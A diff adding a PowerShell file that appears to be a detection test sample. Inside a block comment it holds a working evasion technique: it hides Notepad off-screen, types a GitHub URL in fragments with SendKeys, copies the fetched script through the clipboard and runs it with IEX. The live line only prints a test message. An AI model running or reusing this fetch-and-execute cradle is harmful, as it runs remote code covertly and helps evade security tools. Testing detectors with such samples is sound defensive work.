@@ -1,0 +1,19 @@
+<#
+
+$wshell=New-Object -ComObject WScript.Shell;$reg='HKLM:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');
+@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};
+$curpid=$wshell.Exec($app).ProcessID;Start-Sleep -Milliseconds 3500;
+Start-Sleep -Milliseconds 3500;$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;
+$wshell.SendKeys('htt');Start-Sleep -Milliseconds 500; $wshell.SendKeys('ps:');Start-Sleep -Milliseconds 500; $wshell.SendKeys('//g');Start-Sleep -Milliseconds 500; $wshell.SendKeys('ith');Start-Sleep -Milliseconds 500; $wshell.SendKeys('ub.');Start-Sleep -Milliseconds 500;
+$wshell.SendKeys('com');Start-Sleep -Milliseconds 500; $wshell.SendKeys('/Gi');Start-Sleep -Milliseconds 500; $wshell.SendKeys('tKI');Start-Sleep -Milliseconds 500; $wshell.SendKeys('NG2');Start-Sleep -Milliseconds 500; $wshell.SendKeys('77/Att');Start-Sleep -Milliseconds 500;
+$wshell.SendKeys('ack-Tes');Start-Sleep -Milliseconds 500; $wshell.SendKeys('ts/blo');Start-Sleep -Milliseconds 500; $wshell.SendKeys('b/mai');Start-Sleep -Milliseconds 500; $wshell.SendKeys('n/malici');Start-Sleep -Milliseconds 500; $wshell.SendKeys('ousScr');Start-Sleep -Milliseconds 500;
+$wshell.SendKeys('ipt');Start-Sleep -Milliseconds 500; $wshell.SendKeys('.');Start-Sleep -Milliseconds 500; $wshell.SendKeys('t');Start-Sleep -Milliseconds 500; $wshell.SendKeys('x');Start-Sleep -Milliseconds 500; $wshell.SendKeys('t');Start-Sleep -Milliseconds 500;
+@((' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};
+$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 3500;
+$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};
+If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};
+@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);
+
+#>
+
+write-host "this is a malicious script, try to catch me TEST!"
